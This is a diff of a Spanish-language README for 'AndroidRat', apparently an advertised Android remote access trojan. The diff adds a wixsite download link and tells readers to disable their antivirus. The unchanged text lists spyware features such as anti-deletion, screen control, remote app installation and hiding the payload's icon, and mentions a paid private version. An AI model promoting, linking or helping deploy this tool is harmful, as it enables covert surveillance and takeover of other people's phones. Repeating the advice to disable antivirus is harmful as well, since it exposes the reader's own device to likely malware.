@@ -1,5 +1,5 @@
 # AndroidRat
-AndroidRat
+AndroidRat:DISABLE EL ANTIVIRUS  
 Descargar: https://nibiruanuna.wixsite.com/android-rat-spy
 
 ![230733598-9f8f2107-a1fd-47bd-944b-fbc079c23335](https://github.com/AndroidRatas/AndroidRat/assets/133956592/c617daee-0bff-4433-9e31-9aa2a08212f4)
@@ -35,7 +35,7 @@ Descargar: https://nibiruanuna.wixsite.com/android-rat-spy
 
 ⭐️Mostrar si el dispositivo es administrador
 ![68747470733a2f2f692e696d6775722e636f6d2f4f69554f55326e2e6a7067](https://github.com/AndroidRatas/AndroidRat/assets/133956592/f6df9e75-1575-47ac-b723-485fce0dd544)
-Disponible para rata
+Disponible para rata:https://nibiruanuna.wixsite.com/android-rat-spy
 
 Anti-Borrado
 Control de pantalla
@@ -64,8 +64,8 @@ Instalar aplicación
 Información del dispositivo
 Ocultar/Mostrar el icono de la aplicación de carga útil
 
-Número de WhatsApp +1 (705) 300-3187
-https://t.me/nocrimer
+
+
 
 Versión privada
 Características
